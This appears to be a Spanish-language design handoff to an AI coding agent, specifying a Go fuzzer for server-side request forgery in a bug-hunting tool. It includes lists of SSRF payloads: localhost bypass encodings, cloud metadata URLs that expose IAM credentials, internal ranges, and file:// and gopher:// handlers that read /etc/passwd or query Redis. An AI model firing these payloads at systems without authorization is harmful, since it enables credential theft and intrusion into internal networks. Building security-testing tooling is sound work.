# GEMINI HANDOFF: Go SSRF Fuzzer

**Date:** 2026-01-20  
**Priority:** HIGH  
**Estimated Time:** 2-3 days  
**Scope:** Create a high-performance Go tool for SSRF payload testing

---

## 🎯 OBJETIVO

Crear un fuzzer SSRF en **Go** para probar cientos de bypass URLs en paralelo:

- Localhost bypasses (127.0.0.1, 127.1, 0, [::1], etc.)
- Cloud metadata (169.254.169.254, metadata.google, etc.)
- Internal network ranges (10.x, 192.168.x, etc.)
- Protocol handlers (file://, gopher://, dict://)

---

## 📊 IMPACTO ESPERADO

| Métrica | Python Actual | Go Propuesto | Mejora |
|---------|---------------|--------------|--------|
| Bypass URLs testeadas | ~20 | ~200+ | 10x cobertura |
| Tiempo (100 URLs) | ~30 seg | ~2 seg | 15x más rápido |
| Detección OOB | Polling lento | Goroutine listener | Real-time |

---

## 📋 ESPECIFICACIÓN

### CLI Interface

```bash
./go-ssrf-fuzzer \
    -u "https://target.com/proxy?url=FUZZ" \
    -c 100 \                    # Concurrencia
    -t 5 \                      # Timeout
    --oob "https://interact.sh/abc123" \  # OOB callback URL
    --cloud                     # Include cloud metadata payloads
    --internal                  # Include internal network ranges
    --protocols                 # Include gopher, file, dict
    --json
```

### Output Format

```json
{
    "metadata": {
        "target": "https://target.com/proxy?url=",
        "total_payloads": 250,
        "duration_ms": 1500
    },
    "hits": [
        {
            "payload": "http://169.254.169.254/latest/meta-data/",
            "response_contains": "ami-id",
            "status_code": 200,
            "response_length": 512,
            "severity": "CRITICAL"
        },
        {
            "payload": "http://127.0.0.1:6379/",
            "response_contains": "REDIS",
            "status_code": 200,
            "severity": "HIGH"
        }
    ],
    "oob_callbacks": [
        {"payload": "http://interact.sh/abc123/ssrf", "received": true}
    ]
}
```

---

## 🔧 PAYLOADS INCLUIDOS

### Localhost Bypasses (~50)

```
127.0.0.1
127.1
127.0.1
0
0.0.0.0
[::1]
localhost
localhost.localdomain
127.0.0.1.nip.io
127.0.0.1.xip.io
0x7f000001
2130706433
```

### Cloud Metadata (~30)

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance
```

### Internal Networks (~50)

```
http://10.0.0.1/
http://172.16.0.1/
http://192.168.0.1/
http://192.168.1.1/
# + common ports: 22, 80, 443, 3306, 5432, 6379, 9200
```

### Protocol Handlers (~20)

```
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/INFO
```

---

## 🔗 INTEGRACIÓN CON PYTHON

```python
# bugtrace/tools/external.py
async def run_go_ssrf_fuzzer(url: str, param: str, oob_url: str = None) -> Dict:
    binary_path = settings.TOOLS_DIR / "bin" / "go-ssrf-fuzzer"
    
    fuzz_url = url.replace(f"{param}=", f"{param}=FUZZ")
    
    cmd = [
        str(binary_path),
        "-u", fuzz_url,
        "-c", "100",
        "--cloud", "--internal",
        "--json"
    ]
    
    if oob_url:
        cmd.extend(["--oob", oob_url])
    
    # ... execute and parse JSON
```

---

## ✅ DETECCIÓN DE ÉXITO

1. **Response fingerprints:** Buscar "ami-id", "REDIS", "root:x:0:0", etc.
2. **Error diferencial:** Comparar longitud de respuesta con baseline
3. **OOB callback:** Verificar si llegó ping a interact.sh
4. **Timing:** Delays significativos (>5s) pueden indicar conexión interna

---

## 📁 FILES

| File | Action |
|------|--------|
| `tools/go-ssrf-fuzzer/main.go` | Create |
| `tools/go-ssrf-fuzzer/fuzzer/ssrf.go` | Create |
| `tools/go-ssrf-fuzzer/payloads/` | Create (embedded payloads) |
| `bugtrace/agents/ssrf_agent.py` | Modify (integrate) |
